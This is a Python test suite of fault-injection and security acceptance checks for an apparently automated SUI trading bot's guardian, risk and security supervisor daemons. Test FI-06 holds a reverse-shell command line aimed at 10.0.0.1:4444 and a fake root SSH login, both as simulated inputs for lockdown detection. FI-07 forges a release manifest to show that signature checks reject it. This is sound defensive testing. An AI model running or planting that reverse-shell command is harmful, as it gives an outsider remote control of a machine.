"""P1 Fault-Injection & Security Acceptance Test Matrix (FI-01 through FI-10, QA-05, QA-09, QA-10)."""

from __future__ import annotations

from datetime import datetime, timedelta
from decimal import Decimal
from pathlib import Path

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

from sui_quant.config import RiskConfig
from sui_quant.contracts import AlertSeverity, BreakoutProposal, DataQuality, OrderSide
from sui_quant.daemon.alert_manager import AlertManager, DeliveryStatus
from sui_quant.daemon.external_probe import CloudHostBeaconSender, ExternalDeadMansSwitchEvaluator
from sui_quant.daemon.heartbeat import F02Guardian, ServiceHeartbeat, SimulatedExchangeState
from sui_quant.daemon.r01_server import R01RiskDaemon
from sui_quant.daemon.security_supervisor import S01SecuritySupervisor, SignedReleaseManifest
from sui_quant.daemon.soak_runner import run_accelerated_72h_soak
from sui_quant.daemon.storage import StateStore
from sui_quant.exchange_rules import FilterSourceType, SymbolFilters
from sui_quant.state_machine import TradingState
from sui_quant.utils.clock import monotonic_ns, utc_now


def _make_fresh_dynamic_filters(now: datetime) -> SymbolFilters:
    return SymbolFilters(
        symbol="SUIUSDT",
        min_price=Decimal("0.0001"),
        max_price=Decimal("1000.0"),
        tick_size=Decimal("0.0001"),
        min_qty=Decimal("0.1"),
        max_qty=Decimal("92141578.0"),
        step_size=Decimal("0.1"),
        min_notional=Decimal("5.0"),
        max_notional=Decimal("9000000.0"),
        max_num_orders=200,
        max_num_algo_orders=5,
        max_num_order_lists=20,
        source=FilterSourceType.DYNAMIC_EXCHANGE_INFO,
        fetched_at_utc=now,
    )


def test_fi01_kill9_recovery_and_unprotected_position_restoration(tmp_path: Path) -> None:
    store = StateStore(tmp_path / "state.db")
    alerts = AlertManager(store)
    risk = RiskConfig()
    guardian = F02Guardian(store, alerts, risk)
    now = utc_now()
    dyn_filters = _make_fresh_dynamic_filters(now)

    # Initial boot -> SYNCING -> READY_NO_POSITION
    assert guardian.initiate_boot_syncing("INITIAL_BOOT", now_utc=now) == TradingState.SYNCING
    rep1 = guardian.execute_syncing_reconciliation(
        r01_active_risk_config=risk,
        r01_heartbeat_age_sec=Decimal("1.0"),
        s01_lockdown_active=False,
        disk_free_pct=Decimal("0.80"),
        ntp_offset_ms=Decimal("0.02"),
        f01_data_quality=DataQuality.OK,
        f01_event_age_sec=Decimal("0.2"),
        active_filters=dyn_filters,
        exchange_state=SimulatedExchangeState(actual_sui_qty=Decimal("0")),
        now_utc=now,
    )
    assert rep1.passed is True
    assert store.get_trading_state() == TradingState.READY_NO_POSITION

    # Inject kill -9 crash on d01 -> immediately freezes entry and permits restart
    should_restart = guardian.register_service_crash_and_should_restart(
        service_name="d01",
        reason="SIGKILL_9",
        now_utc=now + timedelta(seconds=10),
    )
    assert should_restart is True
    assert store.get_trading_state() == TradingState.ENTRY_FROZEN

    # Restart enters BOOT -> SYNCING (never directly READY), and discovers an unprotected 10.0 SUI fill (QA-05)
    assert guardian.initiate_boot_syncing("RESTART_AFTER_KILL9", now_utc=now + timedelta(seconds=12)) == TradingState.SYNCING
    rep2 = guardian.execute_syncing_reconciliation(
        r01_active_risk_config=risk,
        r01_heartbeat_age_sec=Decimal("1.0"),
        s01_lockdown_active=False,
        disk_free_pct=Decimal("0.80"),
        ntp_offset_ms=Decimal("0.02"),
        f01_data_quality=DataQuality.OK,
        f01_event_age_sec=Decimal("0.2"),
        active_filters=dyn_filters,
        exchange_state=SimulatedExchangeState(
            actual_sui_qty=Decimal("10.0"),
            avg_fill_price=Decimal("2.0000"),
            fee_asset="SUI",
            fee_amount=Decimal("0.0100"),
            active_protection_qty=Decimal("0"),  # Unprotected on restart!
            can_place_protection_order=True,
        ),
        now_utc=now + timedelta(seconds=15),
    )
    assert rep2.passed is True
    assert rep2.target_state == TradingState.PROTECTED
    assert rep2.reconciled_ledger is not None
    assert rep2.reconciled_ledger.reserved_qty == Decimal("9.9")

    transitions = [t["to_state"] for t in store.list_transitions()]
    # Prove it went through SYNCING -> PROTECTION_PENDING -> PROTECTED
    assert "PROTECTION_PENDING" in transitions
    assert transitions[-1] == "PROTECTED"
    store.close()


def test_fi02_event_loop_stall_detection(tmp_path: Path) -> None:
    store = StateStore(tmp_path / "state.db")
    alerts = AlertManager(store)
    risk = RiskConfig()
    guardian = F02Guardian(store, alerts, risk, stall_timeout_sec=30)
    now = utc_now()
    base_mono = 1_000_000_000_000

    guardian.initiate_boot_syncing("START", now_utc=now)
    guardian.write_heartbeat(
        ServiceHeartbeat(
            service_name="f01",
            pid=1234,
            boot_id="B1",
            monotonic_ns=base_mono,
            wall_time_utc=now,
            loop_tick_seq=42,
            last_work_time_utc=now,
            rss_bytes=50_000_000,
        )
    )
    ok1, status1 = guardian.check_service_health(
        "f01",
        current_monotonic_ns=base_mono + 5 * 1_000_000_000,
        now_utc=now + timedelta(seconds=5),
    )
    assert ok1 is True
    assert status1 == "HEALTHY"

    # Event loop stalls for 31 seconds (loop_tick_seq stuck at 42)
    ok2, status2 = guardian.check_service_health(
        "f01",
        current_monotonic_ns=base_mono + 31 * 1_000_000_000,
        now_utc=now + timedelta(seconds=31),
    )
    assert ok2 is False
    assert status2 == "STALL_DETECTED"
    assert store.get_trading_state() == TradingState.ENTRY_FROZEN
    store.close()


def test_fi03_network_disconnect_freezes_entry(tmp_path: Path) -> None:
    store = StateStore(tmp_path / "state.db")
    alerts = AlertManager(store)
    risk = RiskConfig()
    guardian = F02Guardian(store, alerts, risk)
    now = utc_now()
    dyn_filters = _make_fresh_dynamic_filters(now)

    guardian.initiate_boot_syncing("NET_TEST", now_utc=now)
    rep = guardian.execute_syncing_reconciliation(
        r01_active_risk_config=risk,
        r01_heartbeat_age_sec=Decimal("1.0"),
        s01_lockdown_active=False,
        disk_free_pct=Decimal("0.80"),
        ntp_offset_ms=Decimal("0.05"),
        f01_data_quality=DataQuality.GAP_DETECTED,
        f01_event_age_sec=Decimal("15.0"),
        active_filters=dyn_filters,
        exchange_state=SimulatedExchangeState(reachable=False),
        now_utc=now,
    )
    assert rep.passed is False
    assert "GATE3_MARKET_STREAM_UNHEALTHY" in rep.failed_gates
    assert store.get_trading_state() == TradingState.ENTRY_FROZEN
    store.close()


def test_fi04_disk_watermark_high_and_critical(tmp_path: Path) -> None:
    store = StateStore(tmp_path / "state.db")
    alerts = AlertManager(store)
    cleanup_called = {"count": 0}

    def _mock_cleanup() -> int:
        cleanup_called["count"] += 1
        return 104_857_600

    s01 = S01SecuritySupervisor(
        store=store,
        alert_manager=alerts,
        evidence_dir=tmp_path / "evidence",
        pinned_release_pubkey_hex="a" * 64,
        disk_cleanup_callback=_mock_cleanup,
    )
    now = utc_now()
    store.set_trading_state(TradingState.READY_NO_POSITION)

    # 18% free space (< 20%) -> HIGH alert + automatic cleanup callback triggered, not yet frozen
    ok_high = s01.inspect_disk_watermark(free_space_pct=Decimal("0.18"), now_utc=now)
    assert ok_high is True
    assert cleanup_called["count"] == 1
    assert store.get_trading_state() == TradingState.READY_NO_POSITION

    # 12% free space (< 15%) -> CRITICAL alert + immediate ENTRY_FROZEN
    ok_crit = s01.inspect_disk_watermark(
        free_space_pct=Decimal("0.12"),
        now_utc=now + timedelta(seconds=10),
    )
    assert ok_crit is False
    assert store.get_trading_state() == TradingState.ENTRY_FROZEN
    store.close()


def test_fi05_complete_server_blackout_external_dead_mans_switch() -> None:
    pushed_alerts: list[tuple[str, dict]] = []

    def _mock_fcm_sender(alert_type: str, details: dict) -> bool:
        pushed_alerts.append((alert_type, details))
        return True

    token = "SUIQ-EXTERNAL-WRITE-TOKEN-2026"
    pinned_root = "f" * 64
    sender = CloudHostBeaconSender(token)
    dms = ExternalDeadMansSwitchEvaluator(
        beacon_write_token=token,
        pinned_manifest_root_sha256=pinned_root,
        isolated_fcm_sender=_mock_fcm_sender,
        timeout_seconds=90,
    )

    t0 = utc_now()
    b1 = sender.create_beacon(
        boot_id="BOOT-1",
        sent_at_utc=t0,
        trading_state=TradingState.READY_NO_POSITION,
        r01_healthy=True,
        manifest_root_sha256=pinned_root,
    )
    assert dms.ingest_beacon(b1, recv_utc=t0) is True
    assert dms.evaluate_cron_tick(now_utc=t0 + timedelta(seconds=60)) is None

    # Server suffers total power/network blackout -> 95 seconds pass (> 90s timeout)
    alert_rec = dms.evaluate_cron_tick(now_utc=t0 + timedelta(seconds=95))
    assert alert_rec is not None
    assert alert_rec.alert_type == "SERVER_UNREACHABLE"
    assert alert_rec.severity == AlertSeverity.CRITICAL
    assert alert_rec.fcm_dispatched is True
    assert pushed_alerts[-1][0] == "SERVER_UNREACHABLE"

    # Server recovers in SYNCING state -> external probe records SERVER_RECOVERY_SYNCING
    b2 = sender.create_beacon(
        boot_id="BOOT-2",
        sent_at_utc=t0 + timedelta(seconds=120),
        trading_state=TradingState.SYNCING,
        r01_healthy=True,
        manifest_root_sha256=pinned_root,
    )
    assert dms.ingest_beacon(b2, recv_utc=t0 + timedelta(seconds=120)) is True
    assert pushed_alerts[-1][0] == "SERVER_RECOVERY_SYNCING"


def test_fi06_ssh_anomaly_and_process_port_lockdown(tmp_path: Path) -> None:
    store = StateStore(tmp_path / "state.db")
    alerts = AlertManager(store)
    evidence_dir = tmp_path / "evidence"
    s01 = S01SecuritySupervisor(
        store=store,
        alert_manager=alerts,
        evidence_dir=evidence_dir,
        pinned_release_pubkey_hex="b" * 64,
        allowed_ssh_users=frozenset({"ubuntu"}),
    )
    now = utc_now()
    store.set_trading_state(TradingState.PROTECTED)

    # Inject unauthorized root SSH login success
    ok_ssh = s01.inspect_ssh_auth_logs(
        log_lines=[
            "Oct 31 12:00:01 VM-0-15-ubuntu sshd-session[999]: Accepted password for root from 198.51.100.77 port 52222 ssh2"
        ],
        now_utc=now,
    )
    assert ok_ssh is False
    assert store.get_trading_state() == TradingState.SECURITY_LOCKDOWN

    incidents = store.list_security_incidents()
    assert len(incidents) == 1
    evidence_file = Path(incidents[0]["evidence_path"])
    assert evidence_file.exists()
    assert '"preserve_existing_protection_orders": true' in evidence_file.read_text(encoding="utf-8")

    # Verify suspicious process or unauthorized listening port also triggers lockdown
    ok_proc = s01.inspect_processes_and_ports(
        running_cmdlines=["/usr/bin/python3 -m sui_quant", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
        listening_ports=[22, 53, 323, 31337],
        now_utc=now + timedelta(seconds=5),
    )
    assert ok_proc is False
    assert len(store.list_security_incidents()) == 2
    store.close()


def test_fi07_tampered_config_and_local_manifest_forgery_defeated(tmp_path: Path) -> None:
    store = StateStore(tmp_path / "state.db")
    alerts = AlertManager(store)
    evidence_dir = tmp_path / "evidence"
    code_dir = tmp_path / "code"
    code_dir.mkdir(parents=True, exist_ok=True)
    target_file = code_dir / "strategy.py"
    target_file.write_text("STOP_LOSS = '0.01'\n", encoding="utf-8")

    priv_key = Ed25519PrivateKey.generate()
    pub_hex = (
        priv_key.public_key()
        .public_bytes(encoding=Encoding.Raw, format=PublicFormat.Raw)
        .hex()
    )
    risk = RiskConfig()
    manifest = SignedReleaseManifest.build_and_sign_offline(
        priv_key=priv_key,
        base_dir=code_dir,
        relative_file_paths=("strategy.py",),
        risk_config=risk,
    )

    s01 = S01SecuritySupervisor(
        store=store,
        alert_manager=alerts,
        evidence_dir=evidence_dir,
        pinned_release_pubkey_hex=pub_hex,
    )
    now = utc_now()
    store.set_trading_state(TradingState.READY_NO_POSITION)

    # Clean verification passes
    ok_clean, live_root = s01.inspect_file_and_config_integrity(manifest, code_dir, risk, now_utc=now)
    assert ok_clean is True
    assert live_root == manifest.manifest_root_sha256

    # Attacker modifies strategy.py AND rewrites the local manifest's file_sha256_map + manifest_root_sha256
    # (without possessing the offline Ed25519 private key!)
    target_file.write_text("STOP_LOSS = '0.50'  # TAMPERED\n", encoding="utf-8")
    import hashlib

    forged_file_sha = hashlib.sha256(target_file.read_bytes()).hexdigest()
    forged_map = {"strategy.py": forged_file_sha}
    forged_root = SignedReleaseManifest.compute_manifest_root_sha256(
        release_version=manifest.release_version,
        created_at_utc=manifest.created_at_utc,
        file_sha256_map=forged_map,
        risk_config_sha256=manifest.risk_config_sha256,
    )
    forged_manifest = SignedReleaseManifest(
        release_version=manifest.release_version,
        created_at_utc=manifest.created_at_utc,
        file_sha256_map=forged_map,
        risk_config_sha256=manifest.risk_config_sha256,
        manifest_root_sha256=forged_root,
        ed25519_signature_hex=manifest.ed25519_signature_hex,  # Original signature does not match forged_root!
    )

    ok_tampered, reported_root = s01.inspect_file_and_config_integrity(
        forged_manifest, code_dir, risk, now_utc=now + timedelta(seconds=10)
    )
    assert ok_tampered is False
    assert store.get_trading_state() == TradingState.SECURITY_LOCKDOWN

    # External Dead-Man's Switch also rejects the forged root hash!
    external_alerts: list[str] = []
    dms = ExternalDeadMansSwitchEvaluator(
        beacon_write_token="SUIQ-EXTERNAL-WRITE-TOKEN-2026",
        pinned_manifest_root_sha256=manifest.manifest_root_sha256,
        isolated_fcm_sender=lambda alert_type, details: external_alerts.append(alert_type) or True,
    )
    sender = CloudHostBeaconSender("SUIQ-EXTERNAL-WRITE-TOKEN-2026")
    bad_beacon = sender.create_beacon(
        boot_id="BOOT-1",
        sent_at_utc=now + timedelta(seconds=10),
        trading_state=TradingState.SECURITY_LOCKDOWN,
        r01_healthy=True,
        manifest_root_sha256=reported_root,
    )
    assert dms.ingest_beacon(bad_beacon, recv_utc=now + timedelta(seconds=10)) is False
    assert external_alerts == ["REMOTE_MANIFEST_TAMPERED"]
    store.close()


def test_fi08_guardian_and_r01_self_failure_mutual_watchdog(tmp_path: Path) -> None:
    store = StateStore(tmp_path / "state.db")
    alerts = AlertManager(store)
    risk = RiskConfig()
    guardian = F02Guardian(store, alerts, risk)
    r01 = R01RiskDaemon(store, alerts, risk)
    now = utc_now()
    base_mono = monotonic_ns()

    store.set_trading_state(TradingState.READY_NO_POSITION)
    guardian.write_heartbeat(
        ServiceHeartbeat("guardian", 101, "B1", base_mono, now, 1, now, 30_000_000)
    )
    guardian.write_heartbeat(
        ServiceHeartbeat("r01", 102, "B1", base_mono, now, 1, now, 30_000_000)
    )

    proposal = BreakoutProposal(
        signal_id="SIG-FI08",
        candle_close_utc=now,
        barrier_ref=Decimal("2.0000"),
        p_win=Decimal("0.55"),
        p_stop=Decimal("0.25"),
        p_timeout=Decimal("0.20"),
        ev_net=Decimal("0.0050"),
        confidence=Decimal("0.85"),
        feature_snapshot_hash="a" * 64,
        model_version="a02-v1",
        expiry=now + timedelta(minutes=5),
    )

    # Case 1: R-01 IPC latency exceeds 25ms SLO -> fails closed into ENTRY_FROZEN
    verdict_slow = r01.evaluate_entry_proposal(
        proposal=proposal,
        account_equity_usdt=Decimal("1000.0"),
        rolling_24h_loss_pct=Decimal("0.0"),
        planned_buy_price=Decimal("2.0000"),
        current_monotonic_ns=base_mono + 1_000_000_000,
        simulated_ipc_latency_ns=30_000_000,  # 30ms > 25ms SLO
        now_utc=now + timedelta(seconds=1),
    )
    assert verdict_slow.allowed is False
    assert "R01_IPC_LATENCY_SLO_EXCEEDED" in verdict_slow.reject_reasons
    assert store.get_trading_state() == TradingState.ENTRY_FROZEN

    # Protective SELL exits remain permitted even while ENTRY_FROZEN!
    assert r01.is_protective_exit_permitted(OrderSide.SELL, Decimal("9.9"), Decimal("9.9")) is True
    assert r01.is_protective_exit_permitted(OrderSide.BUY, Decimal("9.9"), Decimal("9.9")) is False

    # Case 2: Guardian (F-02) dies (> 15s without heartbeat) -> R-01 mutual watchdog catches it
    store.set_trading_state(TradingState.READY_NO_POSITION)
    guardian_alive = r01.check_guardian_mutual_watchdog(
        current_monotonic_ns=base_mono + 20 * 1_000_000_000,
        now_utc=now + timedelta(seconds=20),
    )
    assert guardian_alive is False
    assert store.get_trading_state() == TradingState.ENTRY_FROZEN
    store.close()


def test_fi09_crash_loop_circuit_breaker_and_alert_storm_suppression(tmp_path: Path) -> None:
    pushed_count = {"n": 0}

    def _failing_or_counting_sender(alert_evt, details) -> bool:
        pushed_count["n"] += 1
        return True

    store = StateStore(tmp_path / "state.db")
    alerts = AlertManager(store, cooldown_seconds=300, push_sender=_failing_or_counting_sender)
    risk = RiskConfig()
    guardian = F02Guardian(store, alerts, risk, crash_window_sec=300, crash_max_burst=5)
    now = utc_now()

    # 1. Inject 5 crashes within 60 seconds -> 5th crash trips the circuit breaker (returns False)
    results = [
        guardian.register_service_crash_and_should_restart(
            service_name="f01",
            reason=f"CRASH_{i}",
            now_utc=now + timedelta(seconds=i * 5),
        )
        for i in range(1, 7)
    ]
    assert results == [True, True, True, True, False, False]
    assert store.get_trading_state() == TradingState.ENTRY_FROZEN

    # 2. Inject 100 identical HIGH alerts within cooldown window -> deduplicated into 1 push!
    pushed_before = pushed_count["n"]
    last_res = None
    for i in range(100):
        last_res = alerts.emit_alert(
            severity=AlertSeverity.HIGH,
            source="F-01",
            dedup_key="WS_RECONNECT_STORM",
            actions_taken=("BACKOFF_RETRY",),
            details={"seq": i},
            now_utc=now + timedelta(seconds=10 + i),
        )
    assert last_res is not None
    assert last_res.occurrence_count == 100
    assert last_res.was_deduplicated is True
    assert (pushed_count["n"] - pushed_before) == 1
    assert last_res.delivery_status == DeliveryStatus.SENT_AWAITING_ACK

    # Before Android acknowledges, alert remains in undelivered sync queue
    assert len(alerts.list_undelivered_alerts()) >= 1
    alerts.acknowledge_alert(last_res.alert_event.alert_id)
    store.close()


def test_fi10_72h_accelerated_soak_and_resource_budget(tmp_path: Path) -> None:
    report = run_accelerated_72h_soak(
        simulated_hours=72,
        cycles_to_execute=720,
        work_dir=tmp_path / "soak",
    )
    assert report["final_trading_state"] == "READY_NO_POSITION"
    assert report["r01_risk_verdict_latency_ms"]["slo_passed"] is True
    assert report["r01_risk_verdict_latency_ms"]["p99"] <= 25.0
    assert report["memory_rss_mb"]["slope_mb_per_sim_hour"] <= 0.1
